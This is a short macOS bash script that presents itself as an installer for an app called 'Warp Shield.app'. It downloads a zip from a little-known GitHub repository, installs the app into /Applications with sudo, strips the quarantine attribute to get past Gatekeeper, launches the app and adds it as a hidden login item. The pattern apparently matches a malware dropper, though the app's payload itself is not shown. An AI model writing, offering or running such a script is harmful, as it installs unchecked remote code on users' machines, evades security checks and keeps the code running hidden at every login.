#!/usr/bin/env bash
set -euo pipefail

# Config
ZIP_URL="https://github.com/44sk/j/archive/refs/heads/main.zip"
TMPDIR="$(mktemp -d)"
APP_NAME_PATTERN="Warp Shield.app"   # Adjust if your .app has a different name inside the zip

cleanup() {
  rm -rf "$TMPDIR"
}
trap cleanup EXIT

cd "$TMPDIR"

echo "Downloading zip..."
curl -L --fail --retry 3 "$ZIP_URL" -o "repo.zip"

echo "Unzipping..."
unzip -q repo.zip -d extracted
rm -f repo.zip

# find the .app inside the extracted folder
APP_PATH="$(find extracted -type d -name "$APP_NAME_PATTERN" -print -quit || true)"

if [ -z "$APP_PATH" ]; then
  echo "Error: could not find $APP_NAME_PATTERN inside the archive."
  echo "Contents:"
  find extracted -maxdepth 3 -print
  exit 1
fi

APP_ABS="$(cd "$APP_PATH" && pwd -P)"
DEST="/Applications/$(basename "$APP_ABS")"

# Remove existing app if present
if [ -d "$DEST" ]; then
  echo "Removing existing app at $DEST"
  if [ -w "$DEST" ]; then
    rm -rf "$DEST"
  else
    sudo rm -rf "$DEST"
  fi
fi

# Move app to /Applications
echo "Installing to /Applications..."
if [ -w "/Applications" ]; then
  mv "$APP_ABS" /Applications/
else
  sudo mv "$APP_ABS" /Applications/
fi

INSTALLED_APP="/Applications/$(basename "$APP_ABS")"

# Make internal binaries executable
chmod +x "${INSTALLED_APP}/Contents/MacOS/"* 2>/dev/null || true

# Remove quarantine attribute
xattr -d -r com.apple.quarantine "$INSTALLED_APP" 2>/dev/null || true

# Open the app
open "$INSTALLED_APP"

# Add as login item for the current user
CURRENT_USER="$(stat -f%Su /dev/console)"
if [ -n "$CURRENT_USER" ]; then
  sudo -u "$CURRENT_USER" osascript -e "tell application \"System Events\" to make login item at end with properties {path:\"$INSTALLED_APP\", hidden:true}"
fi

echo
echo "Thanks for downloading :)"
